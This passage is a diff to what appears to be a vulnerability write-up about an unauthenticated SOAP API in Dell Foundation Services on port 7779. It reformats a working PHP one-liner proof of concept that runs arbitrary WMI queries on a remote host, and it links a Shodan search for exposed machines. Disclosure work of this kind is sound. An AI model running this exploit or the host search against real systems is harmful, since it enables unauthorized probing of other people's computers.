@@ -21,10 +21,10 @@ One of the methods accessible is `List<WmiManagementItem> GetWmiCollection(strin
 
 [Many potentially vulnerable hosts can be found via Shodan](https://www.shodan.io/search?query=port%3A7779+httpapi+404&language=None) and the issue can also be exploited over a LAN.
 
-Quick PHP one-liner Proof-of-Concept:
+Quick PHP one-liner proof-of-concept:
 
 ````
-`php -r "function wmic($ip,$query) { var_dump(dowmic($ip,$query)); } function dowmic($ip,$query) { return callApi($ip,'GetWmiCollection',array(new SoapVar($query,XSD_STRING,null,null,'wmiQuery','http://tempuri.org/'))); } function callApi($ip,$method,$params = array()) { return (new SoapClient(null,array('location'=>'http://'.$ip.':7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi','uri'=>'http://tempuri.org/')))->__soapCall($method,$params,array('soapaction'=>'http://tempuri.org/ISystemInfoCapabilitiesApi/'.$method)); } wmic('','');"`
+php -r "function wmic($ip,$query) { var_dump(dowmic($ip,$query)); } function dowmic($ip,$query) { return callApi($ip,'GetWmiCollection',array(new SoapVar($query,XSD_STRING,null,null,'wmiQuery','http://tempuri.org/'))); } function callApi($ip,$method,$params = array()) { return (new SoapClient(null,array('location'=>'http://'.$ip.':7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi','uri'=>'http://tempuri.org/')))->__soapCall($method,$params,array('soapaction'=>'http://tempuri.org/ISystemInfoCapabilitiesApi/'.$method)); } wmic('','');"
 ````
 
 This can be expanded to:
